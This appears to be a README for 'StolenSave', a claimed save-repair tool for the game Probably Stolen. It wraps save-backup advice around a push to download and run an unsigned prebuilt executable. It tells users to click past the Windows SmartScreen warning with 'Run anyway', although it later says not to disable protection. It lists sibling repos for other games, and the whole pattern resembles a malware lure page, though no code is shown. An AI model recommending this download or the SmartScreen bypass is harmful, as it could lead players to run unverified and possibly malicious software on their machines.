# Probably Stolen Save Repair — Missing Save Files and Load Game Slots on PC

<p align="center">
  <img src="https://i.postimg.cc/tCVRKh9F/banner.png" alt="Probably Stolen — Save Repair for Windows PC" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Save%20Slot%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-stolen--save--r24-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

**Windows PC · Probably Stolen · Save and troubleshooting documentation**

A save can disappear from the **Load Game** menu without disappearing from your drive. That distinction matters in *Probably Stolen*: on 9 November 2026, a player reported that older saves were still on disk while the game only showed other slots. Their workaround involved creating a fresh slot and using it to access existing progress. The original report is linked below.

This repository covers the **Probably Stolen missing save** and **Probably Stolen save not showing** cases on Windows. The emphasis is on finding the original `.es3` files, making an untouched copy and choosing a recovery path without destroying the only version you still have.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Saved run disappears from Load Game menu | Save file (`.es3`) still exists on disk but slot index is unlinked | Back up `%USERPROFILE%\AppData\LocalLow\Questing Goose Studio\Probably Stolen` |
| Playtest save shows instead of 1.0 main run | Older playtest slot files mixed with full-release `.es3` saves | Compare file sizes and timestamps across all `save_*.es3` files |
| Steam Cloud restores an outdated slot | Cloud sync overwrites local progress on launch | Create an offline backup before resolving Steam Cloud conflicts |
| Testing slot-swap recovery safely | Overwriting active `.es3` files without a clean rollback copy | Work exclusively on duplicates while keeping original `.es3` files untouched |

## Download for Windows

[**Download StolenSave.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/StolenSave.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `StolenSave.exe`? (Automatic checks in ~2 seconds)

- Locates `%USERPROFILE%\AppData\LocalLow\Questing Goose Studio\Probably Stolen` automatically.
- Lists all `.es3` save files and metadata with exact byte sizes and timestamps.
- Creates a safe, timestamped backup copy before you test slot recovery steps.
- Highlights `0 KB` or mismatched slot files without altering game binaries.

### Sample Diagnostic Output

```text
[StolenSave] Scanning Probably Stolen save directory...
[OK]   Save Directory   : C:\Users\Player\AppData\LocalLow\Questing Goose Studio\Probably Stolen
[OK]   save_0.es3       : 142.4 KB | Modified: 2026-11-18 20:11:45
[INFO] save_1.es3       : 138.9 KB | Modified: 2026-11-17 18:04:12 (Unlisted in menu)
[OK]   Steam Cloud Dir  : D:\Steam\userdata\41299104\4348910\remote (2 files)
```

The link downloads the ZIP file attached to the latest GitHub Release, rather than opening the Releases page.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `StolenSave.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Install and run

1. Download **StolenSave.zip** using the link above.
2. Right-click the downloaded archive and choose **Extract All**.
3. Open the extracted folder and start **StolenSave.exe**.
4. Review the program’s options before applying changes to game files, saves, or Windows settings.
5. Launch the game again and check whether the original problem remains.

Close the game before working with its save files. If Windows displays a security warning, check the file and its publisher instead of disabling protection.

## When this guide applies

- The game starts normally, but an older run is missing from the Load Game list.
- You can see files such as `save_1.es3` in Windows even though the corresponding slot is absent in-game.
- A previous playtest run appears, but the current main-game progress does not.
- Steam Cloud contains data, yet the newest available menu slot is older than expected.

## Before changing anything

Close the game, then open the save directory in File Explorer:

`%USERPROFILE%\AppData\LocalLow\Questing Goose Studio\Probably Stolen`

Copy the **whole folder**, including files you do not recognize, to a different location before testing anything. Keep that copy unchanged. Do not rely on Steam Cloud as your only backup; an unwanted sync can preserve the wrong version.

## What to check

Compare the numbered `.es3` files with the slots listed by the game. Note modification dates and sizes, but do not assume the newest timestamp means the file is valid. A missing menu entry is not the same as a corrupt save file.

A player-described workaround creates a new in-game slot, exits, and uses the new slot's filename to test an old save. If you attempt that manually, **work only on duplicates** of the original files and retain both the new slot and all earlier saves in your separate backup. Let the game write a fresh save and verify the day, inventory and progress before considering the recovery complete. This is a community workaround, not an official repair method.

## What this project covers

The release utility should help identify candidate save files and prepare a backup before any recovery operation. It cannot reconstruct a genuinely deleted `.es3` file or guarantee that a damaged file will load. It does not touch game binaries, achievements or Steam authentication.

## Troubleshooting

### The save folder looks empty

Check that File Explorer can display hidden folders, confirm you are in the Windows account that played the game and look for an older backup before generating new saves.

### Steam Cloud restores the wrong slot

Preserve a separate offline copy first. Investigate Steam Cloud conflicts from the Steam client rather than repeatedly overwriting files.

### The copied save loads but looks wrong

Stop there, exit without continuing the run, and restore the untouched backup. A matching slot name alone does not prove compatible save data.

## Frequently asked questions

**Can this recover permanently deleted saves?**

Only if a usable copy still exists locally, in an earlier backup or in a cloud version. A missing file cannot be recreated from a filename.

**Will this delete my other save slots?**

The documented approach is backup-first. Never overwrite a working slot without keeping a separate copy.

**Where are Probably Stolen saves stored?**

The Windows location documented above is the first place to inspect; installs with another user profile can differ.

## Sources and game updates

These links are useful for checking whether a symptom is still present on the latest patch.
- [Steam discussion: Saves missing from game](https://steamcommunity.com/app/4348910/discussions/0/573806123111537409/)
- [Probably Stolen on Steam](https://store.steampowered.com/app/4348910/)

## More Windows Game Diagnostic Tools

- [Stolen-ModProfile](../Stolen-ModProfile) — Probably Stolen local mod profile manager & conflict switcher
- [Dreadmoor-SaveCheck](../Dreadmoor-SaveCheck) — DREADMOOR missing save & progress rollback diagnostics
- [Permafrost-SaveGuard](../Permafrost-SaveGuard) — Permafrost `BackupSaves` & world recovery check
- [MoonSweepers-SaveVault](../MoonSweepers-SaveVault) — Moon Sweepers `MoonSessions` backup & version guard

## Disclaimer

This is an independent community project for Probably Stolen players and is not an official release from the game developer or publisher. A missing save, server outage or internal game bug may not be repairable by third-party software.
 
 
 
 
 
 
 
